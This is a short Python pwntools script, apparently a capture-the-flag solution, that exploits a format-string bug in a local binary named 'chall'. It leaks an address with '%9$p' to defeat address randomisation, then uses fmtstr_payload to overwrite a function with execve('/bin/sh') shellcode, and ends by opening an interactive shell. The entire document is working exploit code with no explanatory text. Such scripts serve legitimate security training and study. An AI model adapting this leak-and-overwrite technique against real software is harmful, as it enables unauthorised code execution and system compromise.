from pwn import *

elf = ELF('./chall')
context.binary = elf
p = gdb.debug(elf.path)#, gdbscript='b *main+200')

p.recv()
p.sendline('1')
p.recv()
p.sendline('%9$p')
p.recv()
p.sendline('2')
first_adr = int(p.recv().split(b'\n')[0], 16)


log.warn('leaked address : ' + str(hex(first_adr)))

#start_of_code_section 
elf.address = first_adr - 0x140e

log.warn('code section starts at : ' + str(hex(elf.address)))

offset = 14
shellcode = asm(shellcraft.execve('/bin/sh\0'))

func = elf.symbols['func']

log.warn('func at : ' + str(hex(func)))

writes = {
	func: shellcode
}

payload = fmtstr_payload(offset, writes, write_size='short')
p.sendline('1')
p.recv()
p.sendline(payload)
p.recv()
p.sendline('2')
p.recv()
p.sendline('3')


p.interactive()
